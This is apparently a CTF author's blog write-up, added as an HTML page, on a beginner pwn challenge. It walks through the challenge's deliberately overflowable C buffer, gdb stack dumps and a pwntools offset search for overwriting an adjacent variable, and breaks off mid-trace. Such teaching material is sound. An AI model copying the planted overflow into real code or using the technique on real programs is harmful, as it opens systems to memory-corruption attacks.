@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+
+  <script type="text/javascript" id="MathJax-script" async
+    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+  </script>
+<script type="text/javascript">
+window.MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']],
+    displayMath: [['$$', '$$'], ['\\[', '\\]']]
+  },
+  chtml: {
+    scale: 1.10   /* Increase font size: 1.0 = default, 1.5 = 150% */
+  }
+};
+</script>
+  <title>blahajctf qualifiers author writeups</title><!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="blahajctf qualifiers author writeups" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="recommended listening is bed for the scraping by fugazi." />
+<meta property="og:description" content="recommended listening is bed for the scraping by fugazi." />
+<link rel="canonical" href="http://localhost:4000/2025/12/20/blahaj-quals.html" />
+<meta property="og:url" content="http://localhost:4000/2025/12/20/blahaj-quals.html" />
+<meta property="og:site_name" content="wrenches" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-12-20T05:40:00+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="blahajctf qualifiers author writeups" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-12-20T05:40:00+08:00","datePublished":"2025-12-20T05:40:00+08:00","description":"recommended listening is bed for the scraping by fugazi.","headline":"blahajctf qualifiers author writeups","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2025/12/20/blahaj-quals.html"},"url":"http://localhost:4000/2025/12/20/blahaj-quals.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="wrenches" /><link rel="shortcut icon" type="image/x-icon" href="" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+
+</head>
+<body a="dark">
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <a href="/"></a><article>
+  <p class="post-meta">
+    <time datetime="2025-12-20 05:40:00 +0800">2025-12-20 05:40:00 +0800</time>
+  </p>
+  
+  <h1>blahajctf qualifiers author writeups</h1>
+
+  <p>recommended listening is <a href="https://www.youtube.com/watch?v=SSFDzFxlNRE">bed for the scraping by fugazi</a>.</p>
+
+<p><img src="https://i.imgur.com/l0FZWHX.png" alt="nana" /></p>
+
+<h2 id="pwndisturbing-the-peace-106-solves">pwn/DISTURBING THE PEACE, 106 solves</h2>
+
+<blockquote>
+  <p><strong>Author:</strong> wrenches</p>
+
+  <p><em>Expected Difficulty: Easy</em></p>
+
+  <p>if you think about it, mementos is kind of like the heap</p>
+</blockquote>
+
+<p>it’s a beginner pwn challenge themed around Persona.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="n">monster_hp</span> <span class="o">=</span> <span class="mi">25000</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">persona</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">player_hp</span> <span class="o">=</span> <span class="mi">500</span><span class="p">;</span>
+
+  <span class="n">init</span><span class="p">();</span>
+
+  <span class="k">while</span> <span class="p">((</span><span class="n">player_hp</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">monster_hp</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">print_battle</span><span class="p">(</span><span class="n">monster_hp</span><span class="p">,</span> <span class="n">player_hp</span><span class="p">);</span>
+    <span class="n">menu</span><span class="p">();</span>
+    <span class="n">printf</span><span class="p">(</span><span class="n">BOLD</span> <span class="s">"YOUR INPUT &gt; "</span> <span class="n">RESET</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="n">getc</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+    <span class="n">getchar</span><span class="p">();</span> <span class="c1">// exhaust newline</span>
+
+    <span class="k">switch</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="p">{</span>
+       <span class="k">case</span> <span class="sc">'1'</span><span class="p">:</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="n">GREEN</span> <span class="s">"MELEE ATTACK! You did 50 damage to the monster."</span> <span class="n">RESET</span><span class="p">);</span>
+        <span class="n">monster_hp</span> <span class="o">-=</span> <span class="mi">50</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="p">}</span>
+
+      <span class="k">case</span> <span class="sc">'2'</span><span class="p">:</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="n">CYAN</span> <span class="s">"What persona are you going to switch to, leader? &gt; "</span> <span class="n">RESET</span><span class="p">);</span>
+        <span class="n">fgets</span><span class="p">(</span><span class="n">persona</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="p">}</span>
+
+      <span class="k">case</span> <span class="sc">'3'</span><span class="p">:</span> <span class="p">{</span>
+        <span class="n">flee</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="p">}</span>
+
+      <span class="nl">default:</span>
+        <span class="n">puts</span><span class="p">(</span><span class="n">RED</span> <span class="s">"Invalid option, leader!"</span> <span class="n">RESET</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">monster_attack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">player_hp</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">player_hp</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="n">RED</span> <span class="s">"</span><span class="se">\n</span><span class="s">Your eyes are getting weary..."</span> <span class="n">RESET</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="n">YELLOW</span> <span class="s">"Better luck next time!"</span> <span class="n">RESET</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">monster_hp</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="n">GREEN</span> <span class="n">BOLD</span> <span class="s">"</span><span class="se">\n</span><span class="s">You've defeated the monster! Good job, leader!"</span> <span class="n">RESET</span><span class="p">);</span>
+    <span class="n">win</span><span class="p">();</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>the goal is to beat the monster so that we can get the flag. unfortunately, the monster has 25000 hp and we only have 500 hp, so it is impossible to beat the monster just through attacking.</p>
+
+<p>we have a buffer overflow vulnerability, however: the <code class="language-plaintext highlighter-rouge">persona</code> variable is defined as an array of 16 characters, but in the option to switch personas, we read 32 characters into that buffer. this means we are able to overflow that buffer and overwrite adjacent variables on the stack.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="n">persona</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+<span class="p">...</span>
+<span class="k">case</span> <span class="sc">'2'</span><span class="p">:</span> <span class="p">{</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">CYAN</span> <span class="s">"What persona are you going to switch to, leader? &gt; "</span> <span class="n">RESET</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">persona</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+  <span class="k">break</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>by dynamically debugging w/ gdb, we can see <em>just</em> what we are able to overwrite on the stack. a nice technique i like to use for debugging these pwn challenges is compiling the given challenge with <em>debug symbols</em>, by using the <code class="language-plaintext highlighter-rouge">-g</code> flag (<code class="language-plaintext highlighter-rouge">// gcc -g -O0 -o main main.c</code>*).</p>
+
+<ul>
+  <li><em>note the -O0 compilation flag, this tells the compiler to not optimize anything. this is important because with different layers of optimization, the compiler might switch around the orders of variables on the stack</em>.</li>
+</ul>
+
+<p>then, we just run the binary with <code class="language-plaintext highlighter-rouge">gdb ./main</code> and place breakpoints by referring to the debug symbols. compiling with debug symbols allows us to see the source code of the binary from the debugger ourselves, so we don’t need to resort to reading assembly. we can do this by making use of the <code class="language-plaintext highlighter-rouge">list</code> command:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">list</span> <span class="n">main</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">85</span>
+<span class="mi">80</span>	       <span class="nf">puts</span><span class="p">(</span><span class="n">GREEN</span> <span class="s">"MELEE ATTACK! You did 50 damage to the monster."</span> <span class="n">RESET</span><span class="p">);</span>
+<span class="mi">81</span>	       <span class="n">monster_hp</span> <span class="o">-=</span> <span class="mi">50</span><span class="p">;</span>
+<span class="mi">82</span>	       <span class="k">break</span><span class="p">;</span>
+<span class="mi">83</span>	     <span class="err">}</span>
+<span class="mi">84</span>	
+<span class="mi">85</span>	     <span class="k">case</span> <span class="sc">'2'</span><span class="p">:</span> <span class="p">{</span>
+<span class="mi">86</span>	       <span class="n">printf</span><span class="p">(</span><span class="n">CYAN</span> <span class="s">"What persona are you going to switch to, leader? &gt; "</span> <span class="n">RESET</span><span class="p">);</span>
+<span class="mi">87</span>	       <span class="n">fgets</span><span class="p">(</span><span class="n">persona</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span> <span class="o">&lt;-</span> <span class="n">our</span> <span class="n">vulnerable</span> <span class="n">function</span><span class="o">!</span>
+<span class="mi">88</span>	       <span class="k">break</span><span class="p">;</span>  
+<span class="mi">89</span>	     <span class="p">}</span>
+</code></pre></div></div>
+
+<p>i’ll place a breakpoint at line 86 with <code class="language-plaintext highlighter-rouge">break main.c:86</code>, and then run the program.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="k">break</span> <span class="n">main</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">86</span>
+<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x143c</span><span class="o">:</span> <span class="n">file</span> <span class="n">main</span><span class="p">.</span><span class="n">c</span><span class="p">,</span> <span class="n">line</span> <span class="mi">86</span><span class="p">.</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">r</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">navi</span><span class="o">/</span><span class="n">ctf</span><span class="o">-</span><span class="n">setting</span><span class="o">/</span><span class="n">blahajctf25</span><span class="o">/</span><span class="n">challenges</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">disturbing</span><span class="o">-</span><span class="n">the</span><span class="o">-</span><span class="n">peace</span><span class="o">/</span><span class="n">dist</span><span class="o">/</span><span class="n">main</span> 
+<span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
+<span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="p">.</span>
+<span class="o">==================================================</span>
+<span class="c1">// DISTURBING THE PEACE \\</span>
+<span class="n">Watch</span> <span class="n">out</span> <span class="n">leader</span><span class="o">!</span> <span class="n">This</span> <span class="n">monster</span><span class="err">'</span><span class="n">s</span> <span class="n">strong</span><span class="p">...</span>
+<span class="n">I</span><span class="err">'</span><span class="n">m</span> <span class="n">not</span> <span class="n">sure</span> <span class="n">you</span><span class="err">'</span><span class="n">ll</span> <span class="n">be</span> <span class="n">able</span> <span class="n">to</span> <span class="n">beat</span> <span class="n">it</span> <span class="n">with</span> <span class="n">attacking</span> <span class="n">alone</span><span class="o">!</span>
+<span class="c1">// - SURPRISE ATTACK! - \\</span>
+<span class="o">==================================================</span>
+
+<span class="o">--------------------------------------------------</span>
+<span class="n">ENEMY</span> <span class="n">HP</span><span class="o">:</span> <span class="mi">25000</span>
+<span class="n">YOUR</span>  <span class="n">HP</span><span class="o">:</span> <span class="mi">500</span>
+<span class="o">--------------------------------------------------</span>
+
+<span class="o">=================</span> <span class="n">ACTION</span> <span class="n">MENU</span> <span class="o">=================</span>
+<span class="mi">1</span> <span class="o">&gt;</span> <span class="n">MELEE</span> <span class="n">ATTACK</span>
+<span class="mi">2</span> <span class="o">&gt;</span> <span class="n">SWAP</span> <span class="n">PERSONAS</span>
+<span class="mi">3</span> <span class="o">&gt;</span> <span class="n">FLEE</span>
+<span class="o">===============================================</span>
+<span class="n">YOUR</span> <span class="n">INPUT</span> <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>to view the contents of the stack after we hit the breakpoint, we just input <code class="language-plaintext highlighter-rouge">stack</code> and look at the addresses. we can also view the values of variables such as <code class="language-plaintext highlighter-rouge">monster_hp</code> by typing in <code class="language-plaintext highlighter-rouge">p monster_hp</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">stack</span>
+<span class="o">-----------------------------------------------------------------</span> <span class="n">Stack</span> <span class="n">top</span> <span class="p">(</span><span class="n">lower</span> <span class="n">address</span><span class="p">)</span> <span class="o">-----------------------------------------------------------------</span>
+<span class="mh">0x7fffffffdbd0</span><span class="o">|+</span><span class="mh">0x0000</span><span class="o">|+</span><span class="mo">000</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>
+<span class="mh">0x7fffffffdbd8</span><span class="o">|+</span><span class="mh">0x0008</span><span class="o">|+</span><span class="mo">001</span><span class="o">:</span> <span class="mh">0x000001f400000000</span>
+<span class="mh">0x7fffffffdbe0</span><span class="o">|+</span><span class="mh">0x0010</span><span class="o">|+</span><span class="mo">002</span><span class="o">:</span> <span class="mh">0x00000a6473667364</span> <span class="p">(</span><span class="err">'</span><span class="n">dsfsd</span><span class="err">\</span><span class="n">n</span><span class="err">'</span><span class="o">?</span><span class="p">)</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">our</span> <span class="n">input</span>
+<span class="mh">0x7fffffffdbe8</span><span class="o">|+</span><span class="mh">0x0018</span><span class="o">|+</span><span class="mo">003</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>
+<span class="mh">0x7fffffffdbf0</span><span class="o">|+</span><span class="mh">0x0020</span><span class="o">|+</span><span class="mo">004</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>
+<span class="mh">0x7fffffffdbf8</span><span class="o">|+</span><span class="mh">0x0028</span><span class="o">|+</span><span class="mo">005</span><span class="o">:</span> <span class="mh">0x0000</span><span class="p">[</span><span class="mi">61</span><span class="n">a8</span><span class="p">]</span><span class="mi">32</span><span class="n">fe19d0</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">where</span> <span class="n">the</span> <span class="n">monster_hp</span> <span class="n">is</span> <span class="n">stored</span>
+<span class="mh">0x7fffffffdc00</span><span class="o">|+</span><span class="mh">0x0030</span><span class="o">|+</span><span class="mo">006</span><span class="o">:</span> <span class="mh">0x00007fffffffdd18</span>  <span class="o">-&gt;</span>  <span class="mh">0x00007fffffffe041</span>  <span class="o">-&gt;</span>  <span class="mh">0x616e2f656d6f682f</span> <span class="err">'</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">navi</span><span class="o">/</span><span class="n">ctf</span><span class="o">-</span><span class="n">setting</span><span class="o">/</span><span class="n">blahajctf25</span><span class="o">/</span><span class="n">challenges</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">disturbing</span><span class="o">-</span><span class="n">the</span><span class="p">[...]</span><span class="err">'</span>
+<span class="mh">0x7fffffffdc08</span><span class="o">|+</span><span class="mh">0x0038</span><span class="o">|+</span><span class="mo">007</span><span class="o">:</span> <span class="mh">0x00007ffff7c29f75</span> <span class="o">&lt;</span><span class="n">__libc_start_call_main</span><span class="o">+</span><span class="mh">0x75</span><span class="o">&gt;</span>  <span class="o">-&gt;</span>  <span class="mh">0xe8000190d4e8c789</span>  <span class="o">&lt;-</span>  <span class="n">retaddr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">(</span><span class="err">$</span><span class="n">savedip</span><span class="p">)</span>
+<span class="o">---------------------------------------------------------------</span> <span class="n">Stack</span> <span class="n">bottom</span> <span class="p">(</span><span class="n">higher</span> <span class="n">address</span><span class="p">)</span> <span class="o">---------------------------------------------------------------</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">p</span> <span class="n">monster_hp</span>
+<span class="err">$</span><span class="mi">2</span> <span class="o">=</span> <span class="mh">0x61a8</span>
+<span class="n">gef</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>we can now see the stack layout. note the following: the monster hp, <code class="language-plaintext highlighter-rouge">0x61a8</code>, is stored below where our input gets written to with respect to the stack. so, let’s see if we can overwrite this value by just spamming ‘A’s for now.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="o">&gt;</span> <span class="n">stack</span>
+<span class="o">-----------------------------------------------------------------</span> <span class="n">Stack</span> <span class="n">top</span> <span class="p">(</span><span class="n">lower</span> <span class="n">address</span><span class="p">)</span> <span class="o">-----------------------------------------------------------------</span>
+<span class="mh">0x7fffffffdbd0</span><span class="o">|+</span><span class="mh">0x0000</span><span class="o">|+</span><span class="mo">000</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>
+<span class="mh">0x7fffffffdbd8</span><span class="o">|+</span><span class="mh">0x0008</span><span class="o">|+</span><span class="mo">001</span><span class="o">:</span> <span class="mh">0x000001f400000000</span>
+<span class="mh">0x7fffffffdbe0</span><span class="o">|+</span><span class="mh">0x0010</span><span class="o">|+</span><span class="mo">002</span><span class="o">:</span> <span class="mh">0x4141414141414141</span> <span class="err">'</span><span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="err">'</span>
+<span class="mh">0x7fffffffdbe8</span><span class="o">|+</span><span class="mh">0x0018</span><span class="o">|+</span><span class="mo">003</span><span class="o">:</span> <span class="mh">0x4141414141414141</span> <span class="err">'</span><span class="n">AAAAAAAAAAAAAAAAAAAAAAA</span><span class="err">'</span>
+<span class="mh">0x7fffffffdbf0</span><span class="o">|+</span><span class="mh">0x0020</span><span class="o">|+</span><span class="mo">004</span><span class="o">:</span> <span class="mh">0x4141414141414141</span> <span class="err">'</span><span class="n">AAAAAAAAAAAAAAA</span><span class="err">'</span>
+<span class="mh">0x7fffffffdbf8</span><span class="o">|+</span><span class="mh">0x0028</span><span class="o">|+</span><span class="mo">005</span><span class="o">:</span> <span class="mh">0x0041414141414141</span> <span class="p">(</span><span class="err">'</span><span class="n">AAAAAAA</span><span class="err">'</span><span class="o">?</span><span class="p">)</span>
+<span class="mh">0x7fffffffdc00</span><span class="o">|+</span><span class="mh">0x0030</span><span class="o">|+</span><span class="mo">006</span><span class="o">:</span> <span class="mh">0x00007fffffffdd18</span>  <span class="o">-&gt;</span>  <span class="mh">0x00007fffffffe041</span>  <span class="o">-&gt;</span>  <span class="mh">0x616e2f656d6f682f</span> <span class="err">'</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">navi</span><span class="o">/</span><span class="n">ctf</span><span class="o">-</span><span class="n">setting</span><span class="o">/</span><span class="n">blahajctf25</span><span class="o">/</span><span class="n">challenges</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">disturbing</span><span class="o">-</span><span class="n">the</span><span class="p">[...]</span><span class="err">'</span>
+<span class="mh">0x7fffffffdc08</span><span class="o">|+</span><span class="mh">0x0038</span><span class="o">|+</span><span class="mo">007</span><span class="o">:</span> <span class="mh">0x00007ffff7c29f75</span> <span class="o">&lt;</span><span class="n">__libc_start_call_main</span><span class="o">+</span><span class="mh">0x75</span><span class="o">&gt;</span>  <span class="o">-&gt;</span>  <span class="mh">0xe8000190d4e8c789</span>  <span class="o">&lt;-</span>  <span class="n">retaddr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">(</span><span class="err">$</span><span class="n">savedip</span><span class="p">)</span>
+<span class="o">---------------------------------------------------------------</span> <span class="n">Stack</span> <span class="n">bottom</span> <span class="p">(</span><span class="n">higher</span> <span class="n">address</span><span class="p">)</span> <span class="o">---------------------------------------------------------------</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">p</span> <span class="n">monster_hp</span>
+<span class="err">$</span><span class="mi">4</span> <span class="o">=</span> <span class="mh">0x414141</span>
+</code></pre></div></div>
+
+<p>we can! we’re now able to modify the <code class="language-plaintext highlighter-rouge">monster_hp</code> just by exploiting our buffer overflow. now, our goal is to be more delicate: we want to overwrite <code class="language-plaintext highlighter-rouge">monster_hp</code> to a <em>lower value</em>.</p>
+
+<p>to do this, we need to figure out what offset we need to write at. i.e., which character of our input corresponds to our inevitable value of <code class="language-plaintext highlighter-rouge">monster_hp</code>?</p>
+
+<p>we can do this by using <code class="language-plaintext highlighter-rouge">pwntools</code>’ <code class="language-plaintext highlighter-rouge">cyclic_gen</code> function. essentially, it just writes a specific ‘pattern’ of bytes that we can use to easily calculate offsets. we’ll generate the pattern with the following commands below.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">cyclic_gen</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="o">=</span> <span class="n">cyclic_gen</span><span class="p">()</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">a</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
+<span class="sa">b</span><span class="s">'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa'</span>
+</code></pre></div></div>
+
+<p>then, we’ll put the pattern in as our input.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">------------------------------------------------------</span> <span class="n">source</span><span class="p">:</span> <span class="n">main</span><span class="p">.</span><span class="n">c</span><span class="o">+</span><span class="mi">86</span> <span class="o">----</span>
+     <span class="mi">81</span>           <span class="n">monster_hp</span> <span class="o">-=</span> <span class="mi">50</span><span class="p">;</span>
+     <span class="mi">82</span>           <span class="k">break</span><span class="p">;</span>
+     <span class="mi">83</span>         <span class="p">}</span>
+     <span class="mi">84</span>   
+     <span class="mi">85</span>         <span class="n">case</span> <span class="s">'2'</span><span class="p">:</span> <span class="p">{</span>
+                           <span class="o">//</span> <span class="n">persona</span> <span class="o">=</span> <span class="mh">0x00007fffffffdbe0</span>  <span class="o">-&gt;</span>  <span class="mh">0x6161616261616161</span> <span class="s">'aaaabaaacaaadaaaeaaafaaagaaahaa'</span>
+<span class="o">*-&gt;</span>  <span class="mi">86</span>           <span class="n">printf</span><span class="p">(</span><span class="n">CYAN</span> <span class="s">"What persona are you going to switch to, leader? &gt; "</span> <span class="n">RESET</span><span class="p">);</span>
+     <span class="mi">87</span>           <span class="n">fgets</span><span class="p">(</span><span class="n">persona</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+     <span class="mi">88</span>           <span class="k">break</span><span class="p">;</span>
+     <span class="mi">89</span>         <span class="p">}</span>
+     <span class="mi">90</span>   
+     <span class="mi">91</span>         <span class="n">case</span> <span class="s">'3'</span><span class="p">:</span> <span class="p">{</span>
+<span class="o">----------------------------------------------------------------</span> <span class="n">threads</span> <span class="o">----</span>
+<span class="p">[</span><span class="o">*</span><span class="n">Thread</span> <span class="n">Id</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span> <span class="n">tid</span><span class="p">:</span><span class="mi">386064</span><span class="p">]</span> <span class="n">Name</span><span class="p">:</span> <span class="s">"main"</span><span class="p">,</span> <span class="n">stopped</span> <span class="n">at</span> <span class="mh">0x55555555543c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mh">0xe2</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">reason</span><span class="p">:</span> <span class="n">BREAKPOINT</span>
+<span class="o">------------------------------------------------------------------</span> <span class="n">trace</span> <span class="o">----</span>
+<span class="p">[</span><span class="o">*</span><span class="c1">#0] 0x55555555543c &lt;main+0xe2&gt;
+</span><span class="p">[</span> <span class="c1">#1] 0x7ffff7c29f75 &lt;__libc_start_call_main+0x75&gt;
+</span><span class="p">[</span> <span class="c1">#2] 0x7ffff7c2a027 &lt;__libc_start_main+0x87&gt; (frame name: __libc_start_main_impl)
+</span><span class="p">[</span> <span class="c1">#3] 0x5555555550f1 &lt;_start+0x21&gt;
+</span><span class="o">-----------------------------------------------------------------------------</span>
+<span class="n">gef</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="o">&amp;</span><span class="n">monster_hp</span>
+<span class="mh">0x7fffffffdbfc</span><span class="p">:</span>	<span class="s">"haa"</span>
+</code></pre></div></div>
+
+<p>we can see that our <code class="language-plaintext highlighter-rouge">monster_hp</code> was overwritten with the value <code class="language-plaintext highlighter-rouge">haa</code>. then, we find the offset of this pattern:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">a</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s">'haa'</span><span class="p">)</span>
+<span class="p">(</span><span class="mi">28</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">28</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>now we know that we need to write <strong>28</strong> filler bytes before we can actually overwrite our <code class="language-plaintext highlighter-rouge">monster_hp</code>. just to verify, let’s write 28 As, then 3 Bs:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">------------------------------------------------------</span> <span class="n">source</span><span class="o">:</span> <span class="n">main</span><span class="p">.</span><span class="n">c</span><span class="o">+</span><span class="mi">86</span> <span class="o">----</span>
+     <span class="mi">81</span>           <span class="n">monster_hp</span> <span class="o">-=</span> <span class="mi">50</span><span class="p">;</span>
+     <span class="mi">82</span>           <span class="k">break</span><span class="p">;</span>
+     <span class="mi">83</span>         <span class="err">}</span>
+     <span class="mi">84</span>   
+     <span class="mi">85</span>         <span class="k">case</span> <span class="sc">'2'</span><span class="p">:</span> <span class="p">{</span>
+                           <span class="c1">// persona = 0x00007fffffffdbe0  -&gt;  0x4141414141414141 'AAAAAAAAAAAAAAAAAAAAAAAAAAAABBB'</span>
+<span class="o">*-&gt;</span>  <span class="mi">86</span>           <span class="n">printf</span><span class="p">(</span><span class="n">CYAN</span> <span class="s">"What persona are you going to switch to, leader? &gt; "</span> <span class="n">RESET</span><span class="p">);</span>
+     <span class="mi">87</span>           <span class="n">fgets</span><span class="p">(</span><span class="n">persona</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+     <span class="mi">88</span>           <span class="k">break</span><span class="p">;</span>
+     <span class="mi">89</span>         <span class="p">}</span>
+     <span class="mi">90</span>   
+     <span class="mi">91</span>         <span class="k">case</span> <span class="sc">'3'</span><span class="p">:</span> <span class="p">{</span>
+<span class="o">----------------------------------------------------------------</span> <span class="n">threads</span> <span class="o">----</span>
+<span class="p">[</span><span class="o">*</span><span class="n">Thread</span> <span class="n">Id</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span> <span class="n">tid</span><span class="o">:</span><span class="mi">386628</span><span class="p">]</span> <span class="n">Name</span><span class="o">:</span> <span class="s">"main"</span><span class="p">,</span> <span class="n">stopped</span> <span class="n">at</span> <span class="mh">0x55555555543c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mh">0xe2</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">reason</span><span class="o">:</span> <span class="n">BREAKPOINT</span>
+<span class="o">------------------------------------------------------------------</span> <span class="n">trace</span> <span class="o">----</span>
+<span class="p">[</span><span class="o">*</span><span class="err">#</span><span class="mi">0</span><span class="p">]</span> <span class="mh">0x55555555543c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mh">0xe2</span><span class="o">&gt;</span>
